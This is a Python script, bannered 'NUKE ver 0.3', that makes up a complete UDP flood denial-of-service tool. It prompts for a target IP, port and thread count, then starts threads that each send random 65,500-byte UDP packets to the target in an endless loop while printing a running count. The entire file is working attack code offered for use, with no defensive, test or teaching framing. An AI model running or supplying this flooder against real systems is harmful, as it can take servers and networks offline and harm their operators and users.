import socket
import threading
import random
import sys

def machine(ip, port, size, i):
    zzz = 0
    srvr = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        srvr.sendto(random._urandom(size), (ip, port))
        zzz += 1
        print(f"CONNECTIONS: {zzz} | TARGET: {ip}:{port}")

def main():
    try:
        if len(sys.argv) < 5:
            print('''
     █▄░█ █░█ █▄▀ █▀▀
     █░▀█ █▄█ █░█ ██▄
         ver 0.3\n''')

        ip = input("IP: ")
        port = int(input("Port: "))
        threads = int(input("Threads: "))
        size = int(65500)

    except KeyboardInterrupt:
        print("Interrupt")
        sys.exit()

    except Exception as e:
        print(f"Error: {e}")
        sys.exit()

    for i in range(threads):
        try:
            t = threading.Thread(target=machine, args=(ip, port, size, i))
            t.start()
        except Exception as e:
            print(f"Error: {i}: {e}")

if __name__ == "__main__":
    main()
